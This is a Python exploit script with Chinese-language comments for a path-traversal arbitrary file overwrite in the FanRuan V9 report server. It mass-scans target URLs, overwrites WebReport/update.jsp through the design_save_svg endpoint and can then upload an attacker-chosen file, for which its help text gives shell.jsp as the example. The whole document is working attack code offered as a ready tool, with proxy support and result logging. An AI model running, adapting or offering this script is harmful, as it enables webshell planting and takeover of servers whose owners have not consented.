#!/usr/bin/python3
import requests
from time import time
from json import dumps
import argparse

def fanruan(url):
    head={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
      'Content-Type':'text/xml;charset=UTF-8'}
    proxy=None
    if args.p:
        key=args.p.split('://')[0]
        proxy={key:args.p}
        #print(proxy)
    randnum=str(time()).split('.')[1]
    #print(randnum)
    data={"__CONTENT__":randnum,"__CHARSET__":"UTF-8"}
    #print(data)
    try:
        r=requests.post(url+'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp',headers=head,data=dumps(data),proxies=proxy)
        # 获取文件内容
        r=requests.get(url+'/WebReport/update.jsp')
        #print(r.text)
        if randnum in r.text:
            print('[+]',url,'存在任意文件覆盖漏洞！')
            if args.o:
                args.o.write(url+' 任意文件覆盖漏洞\n')
            return True
    except:
        return

def upload(url,file):
    head={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
      'Content-Type':'text/xml;charset=UTF-8'}
    proxy=None
    if args.p:
        key=args.p.split('://')[0]
        proxy={key:args.p}
    data={"__CONTENT__":file.read(),"__CHARSET__":"UTF-8"}
    #print(data)
    try:
        r=requests.post(url+'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp',headers=head,data=dumps(data),proxies=proxy)
        print('[+] 覆盖文件:',url+'/WebReport/update.jsp')
    except:
        return

parser=argparse.ArgumentParser(description="X    --By Infiltrator",epilog="GitHub:https://github.com/nhpt")

group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-u',help='目标URL,如:http://test.com')
group.add_argument('-f',type=argparse.FileType('r',encoding='utf8'),help='目标URL文件')

parser.add_argument('-p',help='代理地址,如:http://proxy.com')
parser.add_argument('-sf',type=argparse.FileType('r',encoding='utf8'),help='需要上传到目标服务器的文件,如:shell.jsp')
parser.add_argument('-o', type=argparse.FileType('w', encoding='UTF-8'),help='保存结果到文本文件')

args=parser.parse_args()

banner='''
#################################################
####                                         ####
####  帆软 V9 任意文件覆盖漏洞批量检测及利用 ####
####                                         ####
#################################################
'''
print(banner)
if args.u:
    res=fanruan(args.u)
    if args.sf and res:
        upload(args.u,args.sf)
if args.f:
    ul=args.f.read().split('\n')
    for u in ul:
        res=fanruan(u)
        if args.sf and res:
            upload(u,args.sf)